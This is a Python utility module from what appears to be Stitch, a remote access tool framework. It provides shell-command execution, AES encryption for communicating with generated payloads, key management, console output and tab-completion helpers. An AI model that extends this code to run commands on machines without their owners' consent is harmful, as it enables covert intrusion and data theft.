#!/usr/bin/env python3
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Modernized for Python 3.13

from __future__ import annotations
import cmd
import sys
import zlib
import glob
import math
import base64
import socket
import struct
import shutil
import sqlite3
import zipfile
import threading
import io
import contextlib
import subprocess
import configparser
import os
from time import sleep
from pathlib import Path
from typing import Any, Optional
from Crypto import Random
from getpass import getpass
from Crypto.Cipher import AES
from .Stitch_Vars.globals import *
from .Stitch_Vars.st_aes import *
from colorama import Fore, Style, init, deinit, reinit

# Platform-specific initialization
if sys.platform.startswith('win'):
    init()
    try:
        import pyreadline3.rlmain
        try:
            pyreadline3.rlmain.config.readline_parse_and_bind("tab: complete")
        except AttributeError:
            # Handle the backend attribute error gracefully
            pass
    except (ImportError, AttributeError):
        try:
            import readline
            readline.parse_and_bind("tab: complete")
        except (ImportError, AttributeError):
            pass  # readline not available
    try:
        import win32crypt
    except ImportError:
        win32crypt = None
    p_bar = "="
    temp = Path('C:/Windows/Temp/')
else:
    temp = Path('/tmp/')
    try:
        import readline
        import rlcompleter
        if hasattr(readline, '__doc__') and readline.__doc__ and 'libedit' in readline.__doc__:
            readline.parse_and_bind("bind ^I rl_complete")
        else:
            readline.parse_and_bind("tab: complete")
    except (ImportError, AttributeError):
        pass
    p_bar = '█'

# Add configuration path to sys.path
if str(configuration_path) not in sys.path:
    sys.path.append(str(configuration_path))

# Initialize AES library
aes_lib = configparser.ConfigParser()
aes_lib.read(st_aes_lib)
if aes_abbrev not in aes_lib.sections():
    with open(st_aes_lib, 'w', encoding='utf-8') as aesfile:
        aes_lib.add_section(aes_abbrev)
        aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
        aes_lib.write(aesfile)


def run_command(command: str) -> str:
    """Execute a shell command and return output."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        if result.returncode == 0:
            return result.stdout if result.stdout else '[+] Command successfully executed.\n'
        return f"[!] {result.stderr}"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out.\n"
    except KeyboardInterrupt:
        return "Terminated command.\n"
    except Exception as e:
        return f"[!] {e}\n"


def start_command(command: str) -> str:
    """Start a command in the background."""
    try:
        subprocess.Popen(
            command,
            shell=True,
            stdin=None,
            stdout=None,
            stderr=None,
            close_fds=True
        )
        return '[+] Command successfully started.\n'
    except Exception as e:
        return f'[!] {e}\n'


def no_error(cmd_output: str) -> bool:
    """Check if command output contains an error."""
    return not (cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"))


def encrypt(raw: str | bytes, aes_key: bytes = secret) -> bytes:
    """Encrypt data using AES CFB mode."""
    if isinstance(raw, str):
        raw = raw.encode('utf-8')
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(aes_key, AES.MODE_CFB, iv)
    return base64.b64encode(iv + cipher.encrypt(raw))


def decrypt(enc: str | bytes, aes_key: bytes = secret) -> str:
    """Decrypt data using AES CFB mode."""
    if isinstance(enc, str):
        enc = enc.encode('utf-8')
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(aes_key, AES.MODE_CFB, iv)
    return cipher.decrypt(enc[16:]).decode('utf-8', errors='replace')

def show_aes() -> None:
    """Display the current AES encryption key."""
    st_print('=== Stitch AES Key ===')
    st_print(f'   {aes_encoded}')
    st_print('[*] Copy and add this key to another system running Stitch to '
             'enable communication from payloads created on this system.\n')


def add_aes(key: str) -> None:
    """Add an AES key to the library."""
    aes_lib = configparser.ConfigParser()
    aes_lib.read(st_aes_lib)
    
    if len(key) != 44:
        st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
        return
    
    try:
        decr_key = base64.b64decode(key)
    except Exception as e:
        st_print(f"[!] Decryption error: {e}\n")
        return
    
    if len(decr_key) != 32:
        st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
        return
    
    # Generate abbreviation from key
    aes_abbrev = ''.join([
        key[21], key[0], key[1], key[43], key[5], key[13], key[7],
        key[24], key[31], key[35], key[16], key[39], key[28]
    ])
    
    # Check if key already exists
    if aes_abbrev in aes_lib.sections():
        if aes_lib.get(aes_abbrev, 'aes_key') == key:
            st_print('[*] The AES key has already been added to this system.\n')
            return
    else:
        aes_lib.add_section(aes_abbrev)
    
    with open(st_aes_lib, 'w', encoding='utf-8') as aesfile:
        aes_lib.set(aes_abbrev, 'aes_key', key)
        aes_lib.write(aesfile)
    
    st_print(f'[+] Successfully added "{key}" to the AES key library\n')
    aes_lib.read(st_aes_lib)


def windows_client(system: str = sys.platform) -> bool:
    """Check if the system is Windows."""
    return system.startswith('win')


def osx_client(system: str = sys.platform) -> bool:
    """Check if the system is macOS."""
    return system.startswith('darwin')


def linux_client(system: str = sys.platform) -> bool:
    """Check if the system is Linux."""
    return system.startswith('linux')

def st_print(text: str) -> None:
    """Print formatted text with color coding and logging."""
    formatted_text = f'\n{text}'
    
    if text.startswith('[+]'):
        print_green(formatted_text)
        st_log.info(text[3:].strip())
    elif text.startswith('[*]'):
        print_yellow(formatted_text)
    elif text.startswith('==='):
        print_cyan(formatted_text)
    elif text.startswith(('[-]', '[!]', 'ERROR')):
        print_red(formatted_text)
        if text.startswith('[-]'):
            st_log.info(text[3:].strip())
        elif text.startswith('[!]'):
            st_log.error(text[3:].strip())
        elif text.startswith('ERROR'):
            st_log.error(text[6:].strip())
    else:
        print(formatted_text)


def print_yellow(string: str) -> None:
    """Print text in yellow."""
    if windows_client():
        reinit()
    print(Fore.YELLOW + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client():
        deinit()


def print_blue(string: str) -> None:
    """Print text in blue."""
    if windows_client():
        reinit()
    print(Fore.BLUE + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client():
        deinit()


def print_cyan(string: str) -> None:
    """Print text in cyan."""
    if windows_client():
        reinit()
    print(Fore.CYAN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client():
        deinit()


def print_green(string: str) -> None:
    """Print text in green."""
    if windows_client():
        reinit()
    print(Fore.GREEN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client():
        deinit()


def print_red(string: str) -> None:
    """Print text in red."""
    if windows_client():
        reinit()
    print(Fore.RED + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client():
        deinit()


def get_cwd() -> str:
    """Get current working directory with prompt suffix."""
    return f"{Path.cwd()}>"


def display_banner() -> None:
    """Clear screen and display banner."""
    clear_screen()
    print(banner)


def clear_screen() -> None:
    """Clear the terminal screen."""
    subprocess.run('cls' if windows_client() else 'clear', shell=True)


def check_int(val: str) -> bool:
    """Check if a value can be converted to an integer."""
    try:
        int(val)
        return True
    except ValueError:
        print(f"{val} is not a valid number.")
        return False

def append_slash_if_dir(p: str) -> str:
    """Append path separator to directory paths."""
    path = Path(p)
    if path.is_dir() and not p.endswith(('/', '\\')):
        return f"{p}{path.as_posix()[-1] if path.as_posix().endswith('/') else '/'}"
    return p


def find_patterns(text: str, line: str, begidx: int, endidx: int, 
                  search: list[str]) -> list[str]:
    """Find matching patterns for command completion."""
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return []
    
    arg = line[before_arg + 1:endidx]
    return [n for n in search if n.startswith(arg)]


def find_path(text: str, line: str, begidx: int, endidx: int,
              dir_only: bool = False, files_only: bool = False,
              exe_only: bool = False, py_only: bool = False,
              uploads: bool = False, all_dir: bool = False) -> list[str]:
    """Find file/directory paths for command completion."""
    cur_dir = Path.cwd()
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return []
    
    fixed = line[before_arg + 1:begidx]
    arg = line[before_arg + 1:endidx]
    
    search_dir = uploads_path if uploads else cur_dir
    pattern = f"{arg}*"
    
    completions = []
    for path_str in glob.glob(str(search_dir / pattern)):
        path = Path(path_str)
        
        if dir_only and path.is_dir():
            completions.append(append_slash_if_dir(path_str).replace(fixed, "", 1))
        elif files_only and path.is_file():
            completions.append(path_str.replace(fixed, "", 1))
        elif exe_only and path.is_file() and path.suffix in {'.exe', '.py'}:
            completions.append(path_str.replace(fixed, "", 1))
        elif py_only and path.is_file() and path.suffix == '.py':
            completions.append(path_str.replace(fixed, "", 1))
        elif all_dir:
            if path.is_dir():
                path_str = append_slash_if_dir(path_str)
            completions.append(path_str.replace(fixed, "", 1))
    
    return completions


def find_completion(text: str, opt_list: list[str]) -> list[str]:
    """Find matching options for command completion."""
    if text:
        return [n for n in opt_list if n.startswith(text)]
    return list(opt_list)

class progress_bar:
    """Progress bar for file operations."""
    
    def __init__(self, size: int):
        self.size = int(size)
        self.tick = 0
        self.tracker = 0
        self.progress = 0
        self.bar_size = 50
        self.percent = self.size / self.bar_size if self.size > 0 else 1

    def file_info(self) -> None:
        """Display file size information."""
        file_size = convert_size(float(self.size))
        st_print(f'Total Size: {file_size} ({self.size} bytes)')
        self.display()

    def display(self) -> None:
        """Display initial progress bar."""
        p_output = f"[{' ' * self.bar_size}] %0"
        sys.stdout.write(p_output)
        sys.stdout.flush()
        sys.stdout.write("\b" * len(p_output))

    def increment(self, inc_track: int = 1024, inc_prog: int = 1024, 
                  file_inc: bool = True) -> None:
        """Increment progress bar."""
        self.tracker += inc_track
        self.progress += inc_prog
        
        if file_inc:
            while self.progress >= self.percent and self.tracker < self.size:
                self.progress -= self.percent
                self.tick += 1
                space = self.bar_size - self.tick
                total_percentage = 2 * self.tick
                p_output = f"[{p_bar * self.tick}{' ' * space}] %{total_percentage}"
                sys.stdout.write(p_output)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(p_output))
        else:
            self.tick = int((self.progress / self.size) * self.bar_size)
            space = self.bar_size - self.tick
            total_percentage = 2 * self.tick
            p_output = f"[{p_bar * self.tick}{' ' * space}] %{total_percentage}"
            sys.stdout.write(p_output)
            sys.stdout.flush()
            sys.stdout.write("\b" * len(p_output))

    def complete(self) -> None:
        """Display completed progress bar."""
        sys.stdout.write(f"[{p_bar * self.bar_size}] %100\n")
        sys.stdout.flush()


def print_border(length: int, border: str) -> None:
    """Print a border line."""
    print(border * length)


def st_logger(resp: str, log_path: Path | str, log_name: str, 
              verbose: bool = True) -> None:
    """Log response to a file."""
    if not no_error(resp):
        return
    
    log_path = Path(log_path)
    i = 1
    log_file = log_path / f'{log_name}.log'
    
    while log_file.exists():
        log_file = log_path / f'{log_name} ({i}).log'
        i += 1
    
    if verbose:
        st_print(f"[+] Output has been written to {log_file}\n")
    
    log_file.write_text(resp, encoding='utf-8')


@contextlib.contextmanager
def nostdout():
    """Context manager to suppress stdout, but show output on error."""
    saved_stdout = sys.stdout
    sys.stdout = io.StringIO()
    try:
        yield
    except Exception:
        saved_output = sys.stdout
        sys.stdout = saved_stdout
        print(saved_output.getvalue())
        raise
    finally:
        sys.stdout = saved_stdout


def convert_size(size: float) -> str:
    """Convert bytes to human-readable format."""
    if size == 0:
        return '0 Bytes'
    
    size_names = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size, 1024)))
    p = math.pow(1024, i)
    s = round(size / p, 2)
    return f'{s} {size_names[i]}'


def zipdir(path: Path | str, zipn: zipfile.ZipFile) -> None:
    """Add directory contents to a zip file."""
    path = Path(path)
    for root, dirs, files in os.walk(str(path)):
        for file in files:
            file_path = Path(root) / file
            zipn.write(file_path, file_path.relative_to(path))